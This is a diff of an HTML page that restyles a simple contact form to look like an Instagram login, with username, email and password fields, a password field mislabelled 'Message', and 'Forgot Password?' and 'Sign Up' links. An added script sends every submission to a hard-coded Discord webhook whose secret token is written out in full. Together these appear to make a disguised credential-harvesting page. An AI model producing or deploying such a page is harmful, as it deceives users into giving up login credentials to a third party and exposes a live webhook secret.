@@ -3,76 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Form</title>
+    <title>Contact - Instagram Style</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
             margin: 0;
-            padding: 50px;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #f9d7b0, #f35d36);
+            font-family: 'Arial', sans-serif;
         }
-        .container {
-            max-width: 600px;
-            margin: auto;
+        .login-container {
             background: white;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        h2 {
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
             text-align: center;
-            color: #333;
         }
-        .form-group {
-            margin-bottom: 15px;
+        .login-container h1 {
+            margin: 0 0 20px;
         }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-        }
-        input[type="text"],
-        input[type="email"],
-        textarea {
+        .login-container input {
             width: 100%;
             padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
         }
-        input[type="submit"] {
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            padding: 10px 15px;
-            font-size: 16px;
+        .login-container button {
             width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
         }
-        input[type="submit"]:hover {
-            background-color: #007bb5;
+        .login-container button:hover {
+            background: #0077b6;
+        }
+        .login-container button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .login-container a {
+            display: block;
+            margin: 10px 0;
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+            font-size: 14px;
+        }
+        .message.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        .message.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        .get-app {
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Contact Us</h2>
-        <form>
-            <div class="form-group">
-                <label for="name">Name:</label>
-                <input type="text" id="name" name="name" required>
-            </div>
-            <div class="form-group">
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            <div class="form-group">
-                <label for="message">Message:</label>
-                <textarea id="message" name="message" rows="4" required></textarea>
-            </div>
-            <input type="submit" value="Send Message">
+    <div class="login-container">
+        <h1>Contact Form</h1>
+        <form id="contactForm">
+            <input type="text" id="username" placeholder="Name" required>
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Message" required>
+            <button type="submit" id="submitBtn">Send Message</button>
         </form>
+        <a href="#">Forgot Password?</a>
+        <a href="#">Sign Up</a>
+        <div class="message" id="message"></div>
+        <div class="get-app">
+            <p>Your message will be sent securely.</p>
+        </div>
     </div>
+
+    <script>
+        const form = document.getElementById('contactForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const messageDiv = document.getElementById('message');
+        const webhookUrl = 'https://discord.com/api/webhooks/1476991374397145259/OUGccgf_VPA4L3-SjCqaWSO3HVohkvbpkRUJdTsa5N_-TiKCXHAkQPxYW-uOc0ZYoaUa';
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const name = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+            const message = document.getElementById('password').value;
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+            messageDiv.className = 'message';
+
+            try {
+                const discordMessage = {
+                    embeds: [{
+                        title: 'New Contact Form Submission',
+                        color: 0x0095f6,
+                        fields: [
+                            { name: 'Name', value: name, inline: false },
+                            { name: 'Email', value: email, inline: false },
+                            { name: 'Message', value: message, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordMessage)
+                });
+
+                if (response.ok) {
+                    messageDiv.textContent = 'Thank you! Message sent successfully.';
+                    messageDiv.className = 'message success';
+                    form.reset();
+                } else {
+                    throw new Error('Failed to send');
+                }
+            } catch (error) {
+                messageDiv.textContent = 'Error sending message. Please try again.';
+                messageDiv.className = 'message error';
+                console.error('Error:', error);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Send Message';
+            }
+        });
+    </script>
 </body>
 </html>
